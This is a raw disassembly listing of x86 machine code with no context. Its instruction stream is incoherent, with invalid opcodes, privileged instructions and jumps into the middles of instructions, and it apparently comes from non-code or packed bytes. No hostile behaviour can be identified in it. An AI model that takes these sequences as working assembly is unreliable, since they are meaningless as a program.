  429571:	lock test BYTE PTR [ecx+0x7000801],bh
  429578:	jge    0x42953b
  42957a:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  429580:	cli    
  429581:	xor    bl,bh
  429583:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  429589:	test   BYTE PTR [eax],cl
  42958b:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  429592:	cmp    ebp,eax
  429594:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42959b:	test   BYTE PTR [ebp+0x1],bh
  42959e:	mov    ebx,0x458a00
  4295a3:	xor    esi,DWORD PTR [ebx]
  4295a5:	add    esp,DWORD PTR [esi-0x77]
  4295a8:	pop    ebp
  4295a9:	loopne 0x429611
  4295ab:	inc    ebp
  4295ac:	clc    
  4295ad:	xor    edi,DWORD PTR [ebx]
  4295af:	add    esi,DWORD PTR [edx-0x77]
  4295b2:	data16 fdivr QWORD PTR [ebp-0x49]
  4295b6:	mov    ebx,0xb78afc
  4295bb:	hlt    
  4295bc:	xor    esi,DWORD PTR [esi]
  4295be:	data16 add BYTE PTR [ebp+0x66],bl
  4295c2:	data16 lock clc 
  4295c5:	cmp    eax,DWORD PTR ss:[eax]
  4295c8:	ja     0x429630
  4295ca:	psubq  mm7,QWORD PTR [ebp-0x4]
  4295ce:	ltr    WORD PTR [ebp+0x66]
  4295d2:	add    esi,eax
  4295d4:	add    di,WORD PTR [ebp+0x2b]
  4295d8:	data16 data16 jge 0x429659
  4295dc:	mov    ebx,0xe08a8b
  4295e1:	jge    0x429616
  4295e3:	data16 data16 xor al,0x5d
  4295e7:	data16 data16 jne 0x4295e3
  4295eb:	mov    edi,DWORD PTR [ebx]
  4295ed:	fdiv   QWORD PTR [edx+0x7d]
  4295f0:	data16 data16 jge 0x429628
  4295f4:	mov    ebx,0x758a66
  4295f9:	mov    esi,0x667233
  4295fe:	pop    ebp
  4295ff:	or     BYTE PTR [esi+0x0],ah
  429602:	clc    
  429603:	mov    edi,DWORD PTR [ebx]
  429605:	lock ja 0x429593
  429608:	(bad)  
  42960a:	jge    0x429603
  42960c:	invd   
  42960e:	pop    ebp
  42960f:	add    BYTE PTR [ebx],al
  429611:	(bad)  
  429612:	cmp    di,WORD PTR [ebp+0xf]
  429616:	data16 sbb bh,BYTE PTR [ebp+0x0]
  42961a:	mov    bx,WORD PTR [ebp-0x10]
  42961e:	pop    bp
  429620:	fbstp  TBYTE PTR [ebx]
  429622:	test   DWORD PTR [ebx],eax
  429624:	add    BYTE PTR [ebx],bh
  429626:	add    BYTE PTR [esi+0x7d],ah
  429629:	jge    0x4295b6
  42962b:	data16 in al,dx
  42962d:	pop    ebp
  42962e:	stc    
  42962f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429636:	mov    edi,ebx
  429638:	in     al,dx
  429639:	test   BYTE PTR [ebp+0x0],bh
  42963c:	mov    eax,DWORD PTR [eax]
  42963e:	call   0xbd3f8fce
  429643:	ss cwde 
  429645:	add    BYTE PTR [edx],dh
  429647:	mov    bx,di
  42964a:	call   0x8b4b13da
  42964f:	add    ebp,esp
  429651:	mov    bx,di
  429654:	jnp    0x42967c
  429656:	mov    DWORD PTR [ebx+0x367df808],ecx
  42965c:	mov    eax,DWORD PTR [eax]
  42965e:	call   0x7c3e21c9
  429663:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  429669:	data16 data16 fistp WORD PTR [ebp+0xe]
  42966e:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  429678:	fisttp WORD PTR [ecx-0x7401f77b]
  42967e:	(bad)  
  42967f:	cld    
  429680:	jne    0x4296b8
  429682:	xor    eax,DWORD PTR [eax]
  429684:	mov    esp,DWORD PTR [esi-0x10]
  429687:	sti    
  429688:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42968f:	data16 adc bl,bh
  429692:	push   ebp
  429693:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  42969a:	mov    WORD PTR [eax],es
  42969c:	cwde   
  42969d:	data16 xor bh,bl
  4296a0:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4296a6:	mov    esp,DWORD PTR [esi-0x14]
  4296a9:	fisttp WORD PTR [ebx-0x3748a9f2]
  4296af:	or     al,0x2b
  4296b1:	mov    bh,0xba
  4296b3:	hlt    
  4296b4:	mov    bh,bl
  4296b6:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4296bc:	dec    edi
  4296bd:	or     al,0x0
  4296bf:	mov    edi,DWORD PTR [ebx]
  4296c1:	or     BYTE PTR [ebp+0x3b],dh
  4296c4:	mov    ecx,DWORD PTR [edi]
  4296c6:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4296cc:	xor    al,0xd8
  4296ce:	pop    bp
  4296d0:	lock xor esi,DWORD PTR [ebx]
  4296d3:	lea    esp,[esi+0x1f]
  4296d6:	icebp  
  4296d7:	jb     0x4296dd
  4296d9:	add    al,al
  4296db:	jge    0x4296e9
  4296dd:	mov    eax,eax
  4296df:	fsubr  st,st(3)
  4296e1:	pop    ebp
  4296e2:	mov    esi,DWORD PTR [ebx]
  4296e4:	in     al,0x8d
  4296e6:	rcr    DWORD PTR [edi],0xc2
  4296e9:	jb     0x429749
  4296eb:	add    cl,cl
  4296ed:	jge    0x4296fb
  4296ef:	mov    edx,DWORD PTR [ebp-0x20]
  4296f2:	in     al,dx
  4296f3:	pop    ebp
  4296f4:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4296f9:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4296fd:	mov    ebp,DWORD PTR [ebx]
  4296ff:	fdivr  QWORD PTR [esi+0x668a5d]
  429705:	cmp    al,0x33
  429707:	mov    si,0x4f7d
  42970b:	mov    eax,DWORD PTR [eax]
  42970d:	lock inc ebp
  42970f:	mov    esi,DWORD PTR [edi]
  429711:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  429718:	clc    
  429719:	(bad)  
  42971a:	cmp    edi,DWORD PTR [ebx]
  42971c:	je     0x42972d
  42971e:	push   ebx
  42971f:	loopne 0x429730
  429721:	dec    ecx
  429723:	mov    ebp,DWORD PTR [eax-0x1c]
  429726:	int    0xf1
  429728:	mov    esi,0x703084d
  42972d:	orps   xmm6,xmm1
  429730:	add    BYTE PTR [ebp+0x66],dh
  429733:	jmp    0x429700
  429735:	mov    eax,DWORD PTR [ebx]
  429737:	lock push ebp
  429739:	ror    DWORD PTR [ebp-0x2972feb3],1
  42973f:	or     bh,dl
  429741:	jb     0x429741
  429743:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429749:	loopne 0x42974b
  42974b:	jne    0x429749
  42974d:	data16 add BYTE PTR [esi+eiz*2],dh
  429751:	mov    ecx,ebx
  429753:	data16 ss icebp 
  429756:	add    BYTE PTR [esi],dh
  429758:	data16 add bl,cl
  42975b:	data16 xor dh,dl
  42975e:	add    BYTE PTR [edx],dh
  429760:	data16 add bl,cl
  429763:	enterw 0x4df1,0x19
  429768:	pop    edi
  429769:	jne    0x4296ec
  42976b:	mov    esi,DWORD PTR [edi]
  42976d:	call   0x77b7230e
  429772:	xor    ebp,DWORD PTR [ebx]
  429774:	lea    esp,[esi+0x48]
  429777:	repnz in eax,0x3b
  42977a:	add    BYTE PTR [ebp-0x37],dh
  42977d:	xor    edx,DWORD PTR [ebp-0x15]
  429780:	in     al,dx
  429781:	xor    edx,DWORD PTR [esi+0x40]
  429784:	mov    DWORD PTR [edi],0x338545fc
  42978a:	clc    
  42978b:	add    edi,DWORD PTR [eax]
  42978d:	pop    edi
  42978e:	pushf  
  42978f:	pop    ebx
  429790:	call   0xff439757
  429795:	mov    edi,eax
  429797:	push   ecx
  429798:	pop    es
  429799:	mov    edi,DWORD PTR [ebx]
  42979b:	push   esi
  42979c:	inc    ebx
  42979d:	cld    
  42979e:	js     0x4297a0
  4297a0:	popa   
  4297a1:	data16 (bad) 
  4297a3:	into   
  4297a4:	push   0xb900cd36
  4297a9:	data16 or dh,cl
  4297ac:	pop    es
  4297ad:	xor    ah,BYTE PTR [esi+0x0]
  4297b0:	add    bh,al
  4297b2:	cld    
  4297b3:	cld    
  4297b4:	add    BYTE PTR [ebp+0x38c3f866],al
  4297ba:	ss pushf 
  4297bc:	add    BYTE PTR [esi+0x66],ah
  4297bf:	into   
  4297c0:	ret    
  4297c1:	pop    ebp
  4297c2:	add    al,0x57
  4297c4:	add    BYTE PTR [edi-0x723c409a],dh
  4297ca:	add    edi,edi
  4297cc:	jne    0x42981e
  4297ce:	lea    edx,[ecx+0x1]
  4297d1:	mov    ebx,0xd64ff1
  4297d6:	sar    DWORD PTR [ebx],1
  4297d8:	test   BYTE PTR [ebp+0x30],dh
  4297db:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4297df:	push   edi
  4297e0:	xor    BYTE PTR [ebx],0x3b
  4297e3:	mov    esi,ebx
  4297e5:	xor    eax,DWORD PTR [eax-0x3c73879a]
  4297eb:	xor    BYTE PTR [ebp+0x64],al
  4297ee:	pop    ebx
  4297ef:	mov    ebx,0x9c3a37
  4297f4:	je     0x429821
  4297f6:	xor    edi,DWORD PTR [ebx+0x668a33]
  4297fc:	mov    WORD PTR [ebx],?
  4297fe:	xor    BYTE PTR [ebx+0x8b4f64],bh
  429804:	pop    edi
  429805:	cmp    ecx,ecx
  429807:	jne    0x42985e
  429809:	mov    ebp,esp
  42980b:	cld    
  42980c:	push   esi
  42980d:	pop    ebx
  42980e:	inc    ebp
  42980f:	stc    
  429810:	aaa    
  429811:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  429818:	clc    
  429819:	test   dl,dl
  42981b:	xor    bh,bh
  42981d:	fs pop si
  429820:	or     bl,al
  429822:	cld    
  429823:	mov    eax,DWORD PTR [eax]
  429825:	push   ecx
  429826:	push   di
  429828:	retf   0x3645
  42982b:	aaa    
  42982c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429833:	clc    
  429834:	add    BYTE PTR [ebx+0x66],bl
  429837:	dec    edx
  429839:	mov    edx,DWORD PTR [edi-0x76]
  42983c:	push   edi
  42983d:	add    al,0xb7
  42983f:	xor    al,0xba
  429841:	cmp    al,0x8d
  429843:	je     0x429844
  429845:	mov    edx,DWORD PTR [eax-0x46]
  429848:	push   ecx
  429849:	lea    edi,[ebx+0x504fff]
  42984f:	push   ecx
  429850:	cmp    edx,DWORD PTR [ebx+0x75]
  429853:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429859:	add    BYTE PTR [ebx],dh
  42985b:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  429861:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  429868:	mov    ebx,0x3b3a00
  42986d:	jne    0x42989a
  42986f:	mov    DWORD PTR [ebx+0x728afc],edi
  429875:	xor    esi,DWORD PTR [ebx]
  429877:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  42987d:	push   edi
  42987e:	cmp    esp,ebp
  429880:	jne    0x429882
  429882:	sbb    DWORD PTR [eax],0x8085c3fc
  429888:	clc    
  429889:	inc    ebx
  42988a:	pop    ebx
  42988b:	sti    
  42988c:	add    eax,0xeb8bc075
  429891:	cld    
  429892:	xor    edi,DWORD PTR ds:0xf8c3855e
  429898:	mov    ecx,DWORD PTR [ecx+edx*2]
  42989b:	rol    DWORD PTR [ebp-0x37],0xf
  42989f:	mov    DWORD PTR [eax],ecx
  4298a1:	inc    edi
  4298a2:	(bad)  
  4298a3:	in     eax,0x4
  4298a5:	add    bh,bh
  4298a7:	(bad)  
  4298a8:	mov    esi,0xc38a5e
  4298ad:	mov    esi,DWORD PTR [ebx]
  4298af:	push   ecx
  4298b0:	mov    edi,0xfc4fc7
  4298b5:	test   DWORD PTR [ebp-0x8],edx
  4298b8:	data16 cmp bh,al
  4298bb:	pushf  
  4298bc:	sub    ebp,eax
  4298be:	inc    ebp
  4298bf:	(bad)  
  4298c0:	sub    edi,edi
  4298c2:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4298c8:	inc    ebp
  4298c9:	add    BYTE PTR [esi+0x2b],ah
  4298cc:	or     bh,BYTE PTR [edx+0xf8ac2]
  4298d2:	cmp    al,0x33
  4298d4:	mov    edi,DWORD PTR [edx+0x44f81]
  4298da:	(bad)  
  4298db:	cmp    esi,DWORD PTR [ebx]
  4298dd:	je     0x429897
  4298df:	push   ebx
  4298e0:	dec    edi
  4298e1:	str    ecx
  4298e4:	cmp    ebp,DWORD PTR [eax+0x75]
  4298e7:	int    0x33
  4298e9:	mov    edi,0x789085f
  4298ee:	mov    eax,DWORD PTR [esp+edi*8]
  4298f1:	add    cl,cl
  4298f3:	data16 add al,0xcb
  4298f6:	push   ebp
  4298f7:	add    ebp,esp
  4298f9:	jne    0x4298e7
  4298fb:	(bad)  
  4298fc:	mov    DWORD PTR [ecx],0xd685f7ec
  429902:	clc    
  429903:	xlat   BYTE PTR ds:[ebx]
  429904:	inc    ebp
  429905:	mov    edi,DWORD PTR [ecx]
  429907:	push   eax
  429908:	pushf  
  429909:	in     eax,0x8b
  42990b:	add    ah,ch
  42990d:	cld    
  42990e:	push   eax
  42990f:	add    BYTE PTR [ecx+0x66],dl
  429912:	add    eax,0x3672cb
  429917:	add    BYTE PTR [ebp+0x66],al
  42991a:	(bad)  
  42991b:	retf   
  42991c:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429923:	retf   
  429924:	cmp    al,0xc8
  429926:	pushf  
  429927:	jge    0x4298f0
  429929:	aaa    
  42992a:	cld    
  42992b:	pushf  
  42992c:	test   DWORD PTR [edi-0x8],ebx
  42992f:	je     0x429976
  429931:	xor    esi,DWORD PTR ds:0x7020840
  429937:	ror    BYTE PTR [ebp-0x37],0x8d
  42993b:	push   ebp
  42993c:	add    esp,ebp
  42993e:	jb     0x4298cb
  429940:	add    BYTE PTR [eax],cl
  429942:	dec    ebp
  429943:	mov    bh,0x81
  429945:	push   esi
  429946:	push   eax
  429947:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  42994e:	xor    al,BYTE PTR [eax]
  429950:	mov    edx,DWORD PTR [edi+0x10]
  429953:	(bad)  
  429954:	scas   eax,DWORD PTR es:[edi]
  429955:	xor    bh,BYTE PTR [ebx]
  429957:	add    BYTE PTR [edi],cl
  429959:	mov    ebp,ebp
  42995b:	cld    
  42995c:	add    BYTE PTR [ebx],bh
  42995e:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  429962:	dec    ebp
  429963:	or     BYTE PTR [ebx],ch
  429965:	ret    0x458b
  429968:	lock jmp 0x42995c
  42996b:	mov    ecx,DWORD PTR [eax]
  42996d:	or     BYTE PTR [edi],al
  42996f:	mov    ecx,eax
  429971:	xor    DWORD PTR [edx+0x2],0x0
  429975:	mov    bh,0xc1
  429977:	adc    BYTE PTR [eax],dh
  429979:	iret   
  42997a:	inc    ebp
  42997b:	mov    DWORD PTR [ebx],0x4dfff8c5
  429981:	inc    BYTE PTR [ebx]
  429983:	xor    bh,al
  429985:	add    BYTE PTR [ecx],dl
  429987:	data16 adc al,bh
  42998a:	dec    ecx
  42998b:	fisttp WORD PTR [ecx+0x456604c0]
  429991:	add    dh,BYTE PTR ds:0x75e0845
  429997:	ret    0x4d
  42999a:	lea    ecx,[ebx+0x18728301]
  4299a0:	add    BYTE PTR [ebp+0x45],al
  4299a3:	cmp    cl,ch
  4299a5:	pushf  
  4299a6:	add    bh,al
  4299a8:	add    al,ch
  4299aa:	inc    ebp
  4299ab:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4299b1:	xor    eax,0x781084d
  4299b6:	push   eax
  4299b7:	cwde   
  4299b8:	push   ecx
  4299b9:	xor    al,BYTE PTR [ecx+0x32f89889]
  4299bf:	inc    ebp
  4299c0:	cmp    esp,DWORD PTR [eax]
  4299c2:	jbe    0x429960
  4299c4:	mov    eax,edi
  4299c6:	or     ah,dh
  4299c8:	inc    ebp
  4299c9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4299cf:	cmp    cl,BYTE PTR [ebx-0x74747664]
  4299d5:	in     al,dx
  4299d6:	hlt    
  4299d7:	push   eax
  4299d8:	push   eax
  4299d9:	push   ecx
  4299da:	push   ecx
  4299db:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4299e1:	cwde   
  4299e2:	cwde   
  4299e3:	xor    dh,BYTE PTR [edx]
  4299e5:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4299eb:	or     BYTE PTR [ebp+0x7],al
  4299ee:	mov    eax,ecx
  4299f0:	clc    
  4299f1:	jb     0x4299b4
  4299f3:	add    BYTE PTR [ebp+0x55],cl
  4299f6:	or     DWORD PTR [edi],0xc251d150
  4299fc:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  429a06:	mov    edi,eax
  429a08:	or     cl,al
  429a0a:	inc    ebp
  429a0b:	dec    ebp
  429a0c:	mov    eax,DWORD PTR [ecx+0x514d500c]
  429a12:	or     WORD PTR [ecx],0x8998
  429a17:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  429a1d:	mov    edx,DWORD PTR [ecx+0x8]
  429a20:	mov    eax,DWORD PTR [ebp-0x8]
  429a23:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  429a2a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429a30:	inc    ebp
  429a31:	dec    eax
  429a32:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429a38:	add    edx,DWORD PTR [ecx-0x8]
  429a3b:	mov    ecx,DWORD PTR [ecx]
  429a3d:	clc    
  429a3e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  429a45:	mov    ecx,ebp
  429a47:	clc    
  429a48:	(bad)  
  429a49:	popf   
  429a4a:	inc    DWORD PTR [eax]
  429a4c:	ret    0x8b
  429a4f:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  429a55:	mov    edi,esp
  429a57:	hlt    
  429a58:	test   ecx,esi
  429a5a:	clc    
  429a5b:	or     BYTE PTR [ebp+0x7],al
  429a5e:	cmp    ecx,eax
  429a60:	pushf  
  429a61:	jb     0x429a96
  429a63:	add    BYTE PTR [eax-0x3f],al
  429a66:	inc    eax
  429a67:	daa    
  429a68:	inc    ebp
  429a69:	inc    ebp
  429a6a:	xor    eax,0x7f80803
  429a6f:	dec    ebp
  429a70:	cwde   
  429a71:	add    esi,DWORD PTR [edx]
  429a73:	clc    
  429a74:	cmp    DWORD PTR [ecx],ecx
  429a76:	or     al,0x8
  429a78:	add    al,BYTE PTR [ebp+0x2c]
  429a7b:	xor    eax,0x7350845
  429a80:	or     BYTE PTR [ebp+0x7],cl
  429a83:	lea    ebx,[eax-0x748dcdff]
  429a89:	add    BYTE PTR [eax*2-0x74b21438],cl
  429a90:	mov    edx,DWORD PTR [eax]
  429a92:	cld    
  429a93:	dec    ebp
  429a94:	push   eax
  429a95:	sub    edx,DWORD PTR [ecx-0x75]
  429a98:	add    eax,0xf172fc
  429a9d:	or     BYTE PTR [ebp+0x7],cl
  429aa0:	add    eax,ecx
  429aa2:	or     al,0x72
  429aa4:	add    DWORD PTR [eax],eax
  429aa6:	mov    ebx,0x29c2c1
  429aab:	inc    ebp
  429aac:	mov    eax,DWORD PTR [ebx]
  429aae:	cmp    eax,0x3004d1c
  429ab4:	xbegin 0x66c826ae
  429aba:	clc    
  429abb:	or     BYTE PTR [ebp+0x45],al
  429abe:	cmp    DWORD PTR ds:0x78b089c,esi
  429ac4:	adc    BYTE PTR [ebp+0x45],cl
  429ac7:	lea    eax,[ebp+0x33727501]
  429acd:	add    cl,ch
  429acf:	inc    ebp
  429ad0:	add    bl,ch
  429ad2:	add    BYTE PTR [ebx+0x45850845],cl
  429ad8:	je     0x429a65
  429ada:	push   ebx
  429adb:	or     al,0x85
  429add:	dec    ebp
  429ade:	std    
  429adf:	mov    bh,bh
  429ae1:	mov    BYTE PTR [ebp-0x75],al
  429ae4:	mov    edi,eax
  429ae6:	or     al,0x89
  429ae8:	inc    ebp
  429ae9:	clc    
  429aea:	mov    esp,esp
  429aec:	hlt    
  429aed:	call   DWORD PTR [edi-0x37]
  429af0:	push   eax
  429af1:	or     al,0x51
  429af3:	push   ebp
  429af4:	xor    ebp,esp
  429af6:	mov    esi,0x457251
  429afb:	cmp    dh,al
  429afd:	pushf  
  429afe:	inc    ebp
  429aff:	(bad)  
  429b00:	mov    edi,eax
  429b02:	or     al,0x85
  429b04:	add    al,bh
  429b06:	inc    eax
  429b08:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  429b0c:	or     ah,bh
  429b0e:	inc    eax
  429b0f:	push   eax
  429b10:	jmp    0x429b63
  429b12:	mov    eax,DWORD PTR ds:0xe8720c
  429b18:	mov    DWORD PTR [ebp-0x8],eax
  429b1b:	jne    0x429b62
  429b1d:	jmp    0x429aaa
  429b1f:	mov    ebp,DWORD PTR [eax]
  429b21:	clc    
  429b22:	retf   0xff50
  429b25:	push   ecx
  429b26:	mov    DWORD PTR ds:0x757210,eax
  429b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  429b2f:	sub    esp,DWORD PTR [ebx-0x77]
  429b32:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429b39:	or     ah,bh
  429b3b:	pop    es
  429b3c:	ds cwde 
  429b3e:	push   DWORD PTR [edx]
  429b40:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  429b46:	(bad)  
  429b47:	mov    bh,bh
  429b49:	jmp    0x429b37
  429b4b:	leave  
  429b4c:	jne    0x429b56
  429b4e:	call   0x2f94a8
  429b53:	in     al,dx
  429b54:	dec    ebp
  429b55:	add    dh,BYTE PTR [ebx]
  429b57:	add    BYTE PTR [ebx],al
  429b59:	inc    ebp
  429b5a:	cmp    edi,DWORD PTR [eax]
  429b5c:	je     0x429afa
  429b5e:	mov    eax,edi
  429b60:	or     al,0xf0
  429b62:	add    BYTE PTR [ebp+0x458bf845],al
  429b68:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  429b6e:	adc    al,0x7
  429b70:	enter  0x9fc0,0xa5
  429b74:	rol    BYTE PTR [eax],0x5e
  429b77:	mov    ecx,ecx
  429b79:	or     al,0xc
  429b7b:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  429b82:	jmp    0x429b83
  429b84:	push   ebp
  429b85:	mov    esp,ebp
  429b87:	cld    
  429b88:	inc    ebp
  429b89:	inc    ebp
  429b8a:	or     DWORD PTR [ecx+0x457dec10],0x0
  429b91:	push   esi
  429b92:	push   esi
  429b93:	mov    edi,0x7af080f
  429b98:	add    bh,al
  429b9a:	test   DWORD PTR [eax+0x3a7320f],ebx
  429ba0:	add    BYTE PTR [ecx+0x4540100f],cl
  429ba6:	mov    ebp,eax
  429ba8:	mov    ebp,edi
  429baa:	lock call edx
  429bad:	fcom   DWORD PTR [ebp+0x45]
  429bb0:	mov    eax,0x148a8b
  429bb5:	push   ecx
  429bb6:	enter  0xc145,0x83
  429bba:	cmp    cl,BYTE PTR [eax]
  429bbc:	add    BYTE PTR [ebp+0x4d],al
  429bbf:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429bc5:	call   0xffa29734
  429bca:	cmp    eax,DWORD PTR [ebp-0xc]
  429bcd:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429bd1:	push   ebp
  429bd2:	(bad)
  429bd5:	std    
  429bd6:	lock push DWORD PTR [edi+0x5d08fcdb]
  429bdd:	inc    ebp
  429bde:	(bad)  
  429bdf:	call   0xff7c986f
  429be4:	add    al,BYTE PTR [ebp+0x37]
  429be7:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  429bed:	jne    0x429bef
  429bef:	(bad)  
  429bf0:	cmp    edi,esp
  429bf2:	jne    0x429c25
  429bf4:	mov    edi,edi
  429bf6:	or     BYTE PTR [ebx-0x307f0b49],cl
  429bfc:	pop    ds
  429bfd:	into   
  429bfe:	je     0x429bc1
  429c00:	mov    ebx,DWORD PTR [esi]
  429c02:	or     BYTE PTR [ebp-0x49],al
  429c05:	mov    esp,DWORD PTR [esi-0x77]
  429c08:	mov    esi,0xfc451f0c
  429c0d:	mov    eax,DWORD PTR [eax]
  429c0f:	or     al,0x66
  429c11:	sar    bl,0x3b
  429c14:	xor    esi,DWORD PTR [ebp+0x66]
  429c17:	xor    ecx,edi
  429c19:	pop    edi
  429c1a:	adc    bl,BYTE PTR [ebx+0x78]
  429c1d:	ret    0xff
  429c20:	cld    
  429c21:	inc    ebp
  429c22:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429c28:	cld    
  429c29:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429c30:	push   0xffffff83
  429c32:	pop    edi
  429c33:	or     BYTE PTR [ebp+0x53],dh
  429c36:	xorps  xmm1,xmm2
  429c39:	test   BYTE PTR [eax+eax*1],bh
  429c3c:	add    BYTE PTR [eax],al
  429c3e:	adc    eax,eax
  429c40:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  429c48:	jmp    DWORD PTR [eax]
  429c4a:	ror    al,0x5e
  429c4d:	inc    ebp
  429c4e:	leave  
  429c4f:	xor    ecx,DWORD PTR [eax]
  429c51:	and    DWORD PTR [ebx-0x3ec90708],ecx
  429c57:	add    ch,al
  429c59:	xor    edi,edi
  429c5b:	xor    DWORD PTR [ebx],0x660033fc
  429c61:	mov    DWORD PTR [ebp-0xc],ecx
  429c64:	pcmpgtw mm0,mm0
  429c67:	add    dl,ah
  429c69:	leave  
  429c6a:	mov    edi,DWORD PTR [esi-0x7d]
  429c6d:	push   ax
  429c6f:	dec    ebp
  429c70:	mov    esi,DWORD PTR [ebx-0x75]
  429c73:	lea    ebp,[eax-0x7c00fffc]
  429c79:	xor    eax,DWORD PTR [eax]
  429c7b:	sysret 
  429c7d:	dec    ebp
  429c7e:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  429c85:	push   WORD PTR [ecx+0x8]
  429c89:	jne    0x429c4c
  429c8b:	ud0    ecx,DWORD PTR [ecx]
  429c8e:	mov    esi,DWORD PTR [edx]
  429c90:	lods   al,BYTE PTR ds:[esi]
  429c91:	add    BYTE PTR [eax],al
  429c93:	data16 (bad) 
  429c95:	iret   
  429c96:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  429c9d:	cli    
  429c9e:	inc    ebp
  429c9f:	cmp    al,0x8d
  429ca1:	add    BYTE PTR [esi+0x2d],ah
  429ca4:	inc    ebp
  429ca5:	pop    ebp
  429ca6:	lea    ecx,[edi]
  429ca8:	mov    dl,bh
  429caa:	add    BYTE PTR [edi],cl
  429cac:	mov    DWORD PTR [eax+eax*8],edi
  429caf:	mov    ebx,0x3a87
  429cb4:	add    BYTE PTR [ebx],ch
  429cb6:	inc    ebp
  429cb7:	data16 (bad) 
  429cb9:	clc    
  429cba:	int3   
  429cbb:	cmp    eax,DWORD PTR [eax]
  429cbd:	je     0x429c48
  429cbf:	push   0xffffffc8
  429cc1:	pop    edi
  429cc2:	xchg   DWORD PTR [ebp+0x0],eax
  429cc5:	data16 add BYTE PTR [ebp+0x45],cl
  429cc9:	lea    cx,[ebp+0x10]
  429ccd:	jb     0x429ccf
  429ccf:	jmp    0x429c5a
  429cd1:	call   eax
  429cd3:	clc    
  429cd4:	xchg   DWORD PTR [edi+0x1],edi
  429cd7:	mov    eax,DWORD PTR [eax]
  429cd9:	or     BYTE PTR [ebp-0x49],al
  429cdc:	lea    eax,[eax+0x74003154]
  429ce2:	push   edi
  429ce3:	inc    edx
  429ce4:	jge    0x429ce5
  429ce6:	mov    DWORD PTR [edi],ecx
  429ce8:	fdiv   DWORD PTR [edi-0x6]
  429ceb:	inc    DWORD PTR [eax]
  429ced:	xor    edx,DWORD PTR [eax+0x5f]
  429cf0:	xchg   DWORD PTR [ebx+0x1],ebx
  429cf3:	ret    0x0
  429cf6:	xor    BYTE PTR [ebp-0x51],cl
  429cf9:	cmp    edi,0xf0ff8904
  429cff:	data16 ror al,0x84
  429d03:	rol    BYTE PTR [eax],0x3b
  429d06:	add    al,dh
  429d08:	dec    eax
  429d09:	xchg   esp,eax
  429d0a:	push   ebx
  429d0b:	jmp    0x429c98
  429d0d:	push   ebp
  429d0e:	add    esp,ebp
  429d10:	add    ebp,esp
  429d12:	mov    edx,DWORD PTR [edi+0x24]
  429d15:	clc    
  429d16:	dec    esi
  429d17:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  429d1d:	cmp    BYTE PTR [ebx],al
  429d1f:	jne    0x429caa
  429d21:	xor    esp,eax
  429d23:	jmp    0x459ea6
  429d28:	add    ebp,DWORD PTR [ecx+ecx*4]
  429d2b:	jne    0x429d21
  429d2d:	call   0xffcc9a87
  429d32:	clc    
  429d33:	xchg   edi,eax
  429d34:	sti    
  429d35:	add    DWORD PTR [ebx],eax
  429d37:	add    BYTE PTR [ebp+0x47],bl
  429d3a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  429d40:	pop    ebp
  429d41:	mov    DWORD PTR [esi-0x48],esi
  429d44:	jmp    0x429d8d
  429d46:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  429d4c:	(bad)  
  429d4e:	cmp    al,0x0
  429d50:	cmp    eax,DWORD PTR [ebp+0x18]
  429d53:	lea    ebx,[ebp-0x56]
  429d56:	jle    0x429d58
  429d58:	jae    0x429ce3
  429d5a:	mov    eax,esp
  429d5c:	call   0xb900:0x8b005587
  429d63:	inc    ebp
  429d64:	push   ebp
  429d65:	lea    ecx,[ebp-0x27ff4f12]
  429d6b:	mov    eax,edi
  429d6d:	int3   
  429d6e:	push   ebp
  429d6f:	xchg   edi,eax
  429d71:	add    esp,ebp
  429d73:	add    BYTE PTR [eax],al
  429d75:	inc    ebp
